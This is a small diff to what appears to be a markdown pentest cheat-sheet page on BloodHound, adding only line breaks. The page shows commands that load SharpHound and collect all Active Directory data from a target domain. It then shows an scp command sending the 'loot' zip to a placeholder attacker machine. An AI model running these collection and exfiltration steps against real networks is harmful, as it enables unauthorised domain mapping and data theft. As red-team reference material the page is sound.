@@ -27,9 +27,9 @@ description: A tool to reveal the hidden and often unintended relationships with
  > **<font color=red>. .\SharpHound.ps1</font>**</br>
  > Initialize SharpHound.
  > 
- > **<font color=red>Invoke-Bloodhound -CollectionMethod All -Domain</font> \[TARGET_DOMAIN\] <font color=red>-ZipFileName</font> BloudhoundLoot.zip**
+ > **<font color=red>Invoke-Bloodhound -CollectionMethod All -Domain</font> \[TARGET_DOMAIN\] <font color=red>-ZipFileName</font> BloudhoundLoot.zip**</br>
  > Run SharpHound.
 
  > 
- > **<font color=red>scp</font> BloudhoundLoot.zip myUser<font color=red>@</font>\[ATTACKER_MACHINE\]<font color=red>:</font>/home/myUser/**
+ > **<font color=red>scp</font> BloudhoundLoot.zip myUser<font color=red>@</font>\[ATTACKER_MACHINE\]<font color=red>:</font>/home/myUser/**</br>
  > Bring back the loot to the attacker's machine, and open it in Bloodhound Web UI.
